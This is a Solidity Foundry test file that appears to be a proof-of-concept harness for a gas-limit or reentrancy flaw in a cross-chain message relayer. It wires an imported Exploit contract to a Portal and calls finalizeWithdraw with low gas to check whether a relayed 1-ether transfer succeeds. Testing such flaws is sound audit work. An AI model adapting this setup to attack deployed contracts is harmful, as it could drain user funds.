// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Exploit.sol";
import "../src/RelayMessagerReentrancy.sol";
import "../src/Portal.sol";
import "forge-std/console.sol";

contract CounterTest is Test {

    RelayMessagerReentrancy messager = new RelayMessagerReentrancy(address(this));
    Exploit exploit = new Exploit(address(messager));
    Portal portal = new Portal(address(messager));

    uint256 nonce = 1;
    address sender = address(this);
    address target = address(exploit);
    uint256 value = 0;
    uint256 minGasLimit = 100000000 wei;

    function createMessage() public returns (bytes memory) {

        bytes memory message = abi.encodeWithSelector(
            Exploit.call.selector,
            messager,
            3,
            sender,
            target,
            0,
            minGasLimit
        );

        return message;

    }

    function setUp() public {

    }

    function testHasEnoughGas() public {

        address bob = address(1231231243);

        console.log("bob's balance before");
        console.log(bob.balance);

        uint256 minGasLimit = 30000 wei;

        address sender = address(this);

        address target = bob;

        bytes memory message = abi.encodeWithSelector(
            '0x',
            messager,
            4,
            sender,
            target,
            1 ether,
            minGasLimit
        );

        bytes memory messageRelayer = abi.encodeWithSelector(
            RelayMessagerReentrancy.relayMessage.selector,
            4,
            sender,
            target,
            1 ether,
            minGasLimit,
            message   
        );

        portal.finalizeWithdraw{value: 1 ether, gas: 200000 wei}(minGasLimit, 1 ether, messageRelayer);

        console.log("bob's balance after the function call");
        console.log(bob.balance);

    }



    function testOutOfGas() public {

        address bob = address(1231231243);

        console.log("bob's balance before");
        console.log(bob.balance);

        uint256 minGasLimit = 30000 wei;

        address sender = address(this);

        address target = bob;

        bytes memory message = abi.encodeWithSelector(
            '0x',
            messager,
            4,
            sender,
            target,
            1 ether,
            minGasLimit
        );

        bytes memory messageRelayer = abi.encodeWithSelector(
            RelayMessagerReentrancy.relayMessage.selector,
            4,
            sender,
            target,
            1 ether,
            minGasLimit,
            message   
        );

        portal.finalizeWithdraw{value: 1 ether, gas: 110000 wei}(minGasLimit, 1 ether, messageRelayer);

        console.log("bob's balance after the function call");
        console.log(bob.balance);

    }

}
